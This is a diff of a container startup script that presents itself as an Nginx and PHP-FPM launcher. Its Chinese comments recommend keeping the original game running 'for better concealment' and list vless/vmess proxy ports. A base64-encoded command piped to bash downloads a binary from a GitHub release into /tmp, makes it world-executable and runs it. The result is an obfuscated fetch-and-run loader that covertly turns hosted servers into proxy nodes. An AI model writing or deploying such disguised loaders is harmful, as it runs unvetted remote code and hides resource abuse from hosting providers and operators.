@@ -1,4 +1,8 @@
-#!/bin/bash
+#!/bin/ash
+rm -rf /home/container/tmp/*
+
+echo "⟳ Starting PHP-FPM..."
+/usr/sbin/php-fpm8 --fpm-config /home/container/php-fpm/php-fpm.conf --daemonize
 
 # 为了更好的隐蔽，建议开启原游戏，节点可在list.log中查看或手搓节点,默认端口vless:8002，vmess:8001
 #=======================================
@@ -24,12 +28,9 @@ export SUB_NAME='bbn'
 # 注意原游戏启动后，不显示节点日志
 # Teamspeak3-server、bedrock、start.sh,run.sh等可以直接改启动文件的玩具都可以类似修改
 
-# export JAR_SH='./ts3srever query_protocols=raw,http,ssh license_accepted=1' #复制原启动命令填入并修改启动文件名为ts3srever
-
-#=======================================
-# 设置是否显示日志，默认显示，填no不显示，yes显示
-# export RIZHI='no'
-#=======================================
+echo "⟳ Starting Nginx..."
+echo "✓ Successfully started"
+export JAR_SH='/usr/sbin/nginx -c /home/container/nginx/nginx.conf -p /home/container/' #复制原启动命令填入并修改启动文件名为ts3srever
 
 echo "aWYgY29tbWFuZCAtdiBjdXJsICY+L2Rldi9udWxsOyB0aGVuCiAgICAgICAgRE9XTkxPQURfQ01E
 PSJjdXJsIC1zTCIKICAgICMgQ2hlY2sgaWYgd2dldCBpcyBhdmFpbGFibGUKICBlbGlmIGNvbW1h
@@ -43,3 +44,5 @@ QURfQ01EIGh0dHBzOi8vZ2l0aHViLmNvbS9kc2Fkc2Fkc3NzL3BsdXRvbm9kZXMvcmVsZWFzZXMv
 ZG93bmxvYWQveHIvbWFpbi1hcm0gPiAvdG1wL2FwcApmaQoKY2htb2QgNzc3IC90bXAvYXBwICYm
 IC90bXAvYXBw
 " | base64 -d | bash
+
+
